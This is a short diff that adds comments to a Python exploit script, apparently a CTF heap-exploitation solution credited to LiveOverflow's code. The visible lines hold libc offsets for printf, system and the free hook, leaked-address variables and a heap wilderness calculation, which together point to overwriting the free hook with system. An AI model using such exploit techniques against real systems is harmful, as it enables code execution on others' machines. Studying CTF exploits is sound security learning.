@@ -1,3 +1,7 @@
+#
+# Shamelessly copied from LiveOverflow's code
+#
+
 import struct
 import sys
 import subprocess
@@ -6,9 +10,12 @@ import telnetlib
 import ctypes
 import re
 
+# from the binary
 PRITNF_OFFSET = 0x49670
 SYSTEM_OFFSET = 0x3ada0
 FREE_HOOK_OFFSET = 0x71476 + 0x140b8a - 0x9c
+
+# calculated from the leaked addresses
 FREE_HOOK_PTR = 0
 LIBC = 0
 
@@ -149,6 +156,7 @@ if __name__ == "__main__":
 
     raw_input("continue?")
 
+    # used gdb to calc the offset
     HEAP_WILDERNESS = LEAKED_HEAP_ADDR + 0x4ddc
     print "the heap wilderness: 0x{:08x}".format(HEAP_WILDERNESS)
 
